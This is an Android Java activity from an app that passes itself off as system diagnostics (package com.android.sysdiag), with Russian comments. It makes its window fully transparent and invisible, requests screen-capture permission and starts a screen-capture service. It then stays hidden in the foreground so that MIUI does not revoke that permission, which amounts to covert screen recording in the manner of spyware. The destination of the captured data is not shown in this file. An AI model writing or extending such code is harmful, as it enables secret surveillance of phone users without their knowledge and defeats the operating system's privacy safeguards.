package com.android.sysdiag;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationManagerCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CAPTURE = 0x1001;
    private static final int REQ_NOTIF   = 0x1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Делаем окно прозрачным и невидимым
        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        );

        // Пустой невидимый TextView, чтобы activity не выглядела пустой
        TextView hidden = new TextView(this);
        hidden.setText("");
        hidden.setBackgroundColor(Color.TRANSPARENT);
        hidden.setGravity(Gravity.CENTER);
        setContentView(hidden);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                requestPermissions(
                    new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
                    REQ_NOTIF
                );
                return;
            }
        }
        requestProjection();
    }

    private void requestProjection() {
        MediaProjectionManager mpm =
            (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAPTURE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                ScreenCaptureService.start(this, resultCode, data);

                // НЕ закрываем activity, не уводим в фон.
                // Вместо этого делаем её максимально невидимой,
                // но живой — чтобы MIUI не сбросил разрешение.
                try {
                    getWindow().setDimAmount(0f);
                    getWindow().getDecorView().setAlpha(0f);
                    getWindow().getDecorView().setVisibility(View.INVISIBLE);
                } catch (Throwable ignored) {}
            } else {
                Toast.makeText(this, "Diagnostics disabled", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] perms, int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        if (requestCode == REQ_NOTIF) requestProjection();
    }
}
